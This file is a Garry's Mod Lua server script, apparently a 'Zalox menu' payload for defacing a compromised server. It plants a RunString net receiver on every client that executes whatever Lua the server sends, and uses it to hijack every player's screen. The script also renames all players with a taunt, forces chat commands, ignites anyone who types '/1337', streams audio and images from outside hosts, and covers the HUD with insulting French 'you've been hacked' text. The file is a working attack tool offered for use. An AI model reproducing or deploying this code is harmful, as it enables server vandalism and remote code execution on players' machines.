util.AddNetworkString "slua2"

local DESIRED_NAME = "Zalox menu Nous Domine :("
local lol = {}
function lol:RandomString( intMin, intMax )
    local ret = ""
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end

    return ret
end

lol.m_tblActions = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]

function lol:PushAction( intChainDelay, func )
    self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end

function lol:NextAction( pPlayer )
    pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
    if not self.m_tblActions[pPlayer.m_intCurAction] then return end

    timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
        if not IsValid( pPlayer ) then return end
        self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
        self:NextAction( pPlayer )
    end )

end

function lol:Start( pPlayer )
    pPlayer.m_intCurAction = 0
    self:NextAction( pPlayer )
end

function lol:SendLua( pPlayer, strLua )
    net.Start( "slua2" )
        net.WriteString( strLua )
    net.Send( pPlayer )
end

function lol:SetupPlayer( pPlayer )
    pPlayer:SendLua( "net.Receive(\"slua2\", function() RunString(net.ReadString()) end)" )
end


-------START CODE FORT BAN/UNBAN/ETC...

----------STOP LINE CODE FORT BAN/UNBAN/ETC...

-----START LINE CODE FOR DANSE
for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
-----STOP LINE CODE FOR DANSE

------- STARTCODE FOR FORCE CHANGE NAME
for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, DESIRED_NAME) v:setDarkRPVar("rpname", DESIRED_NAME) end 
------- STOP LINE CODE FOR CHANGE NAME

for k,v in pairs(player.GetAll()) do
    v:ConCommand("say /tp *")
end




for k, v in pairs( player.GetAll() ) do
    lol:SetupPlayer( v )
    timer.Simple( 2, function() lol:Start( v ) end )
end

hook.Add( "PlayerAuthed", "wat", function( pPlayer )
    lol:SetupPlayer( pPlayer )
    timer.Simple( 10, function() lol:Start( pPlayer ) end ) 
end )

hook.Add( "PlayerSay", "1337command", function( pSender, strText, bTeamChat )
    if strText:sub( 1, 5 ) == "/1337" then
        pSender:Ignite( 1e9 )
        pSender:ChatPrint( "fuck this job i quit" )
        pSender:SendLua( [[surface.PlaySound( "vo/npc/male01/hacks01.wav" )]] )
        return false
    end
end )


--Sequence stack
--Start some tunes and steam in our assets
lol:PushAction( 0, function( pPlayer )
    lol:SendLua( pPlayer, ([=[
        sound.PlayURL( "https://musiquetarexmenu.mtxserv.fr/hackedbytarexteam.mp3", "", function()end )
        
        g_]=].. lol.m_strImageGlobalVar.. [=[ = {}
        local html = [[%s]]
        local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
            local pnl = vgui.Create( "HTML" )
            pnl:SetPos( ScrW() -1, ScrH() -1 )
            pnl:SetVisible( true )
            pnl:SetMouseInputEnabled( false )
            pnl:SetKeyBoardInputEnabled( false )
            pnl:SetSize( intSizeX, intSizeY )
            pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
            
            local PageLoaded
            PageLoaded = function()
                local mat = pnl:GetHTMLMaterial()
                if mat then
                    g_]=].. lol.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
                    return
                end
                
                timer.Simple( 0.5, PageLoaded )
            end

            PageLoaded()
        end

LoadWebMaterial( "https://image.noelshack.com/fichiers/2018/51/7/1545583088-dsdfsdfsd.png", "getrekt", 1920, 1080 )
]=]):format(lol.m_strImageLoadHTML) )
end )

--HUD swap
lol:PushAction( 23, function( pPlayer )
    lol:SendLua( pPlayer, [[
        (GAMEMODE or GM).CalcView = function() end
        (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

        local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
        end

        local function GetWebMat( strURL )
            return g_]].. lol.m_strImageGlobalVar.. [[[strURL]
        end
for k,v in pairs(player.GetAll()) do
    v:ConCommand("say /tp *")
end
        hook.Add( "HUDPaint", "newhud", function()
            surface.SetDrawColor( 255, 255, 255, 255 )


                        if GetWebMat( "getrekt" ) then
                                surface.SetDrawColor(0,0,0)
                                surface.DrawRect( 0, 0, 2100, 2000 )
                                surface.SetMaterial( GetWebMat("getrekt")[1] )
                                surface.DrawTexturedRect( 0, 0, 2100, 2000 )
                        end

                draw.SimpleTextOutlined(
                "Zalox Menu By TaRex",
                "pityersave",
                ScrW() /2 +math.random( -1, 1 ),
                ScrH() /2 +math.random( -1, 1 ),
                Color(255,255,255),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            ) 

                draw.SimpleTextOutlined(
                "Au non il nous on hacker notre serveur ",
                "pityersave",
                ScrW() /2 +math.random( -8, 8 )+300,
                ScrH() /2 +math.random( -8, 8 )+300,
                Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            ) 

            draw.SimpleTextOutlined(
                "Ta hacker ",
                "pityersave",
                ScrW() /2 +math.random( -8, 8 )-600,
                ScrH() /2 +math.random( -8, 8 )-500,
                Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            ) 

             draw.SimpleTextOutlined(
                "Ton serveur a 2 euros ",
                "pityersave",
                ScrW() /2 +math.random( -8, 8 )-200,
                ScrH() /2 +math.random( -8, 8 )+100,
                Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            ) 

                         draw.SimpleTextOutlined(
                "Les admin on vous encule ",
                "pityersave",
                ScrW() /2 +math.random( -8, 8 )-400,
                ScrH() /2 +math.random( -8, 8 )-100,
                Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            ) 

            draw.SimpleTextOutlined(
                "Zalox is the best menu ",
                "pityersave",
                ScrW() /2 +math.random( -8, 8 )-100,
                ScrH() /2 +math.random( -8, 8 )-520,
                Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            )

              draw.SimpleTextOutlined(
                "Create By TaRex ",
                "pityersave",
                ScrW() /2 +math.random( -8, 8 )+400,
                ScrH() /2 +math.random( -8, 8 )-400,
                Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            )


              draw.SimpleTextOutlined(
                "RIP Ton Serveur ",
                "pityersave",
                ScrW() /2 +math.random( -8, 8 )-500,
                ScrH() /2 +math.random( -8, 8 )+450,
                Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)),
                TEXT_ALIGN_CENTER,
                TEXT_ALIGN_CENTER,
                1,
                Color(0,0,0,0)
            )
        end )

        local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
        hook.Add( "HUDShouldDraw", "newhud", function( str ) if not allowed[str] then return false end end )

        surface.PlaySound( "vo/npc/male01/hacks01.wav" )
    ]] )
end )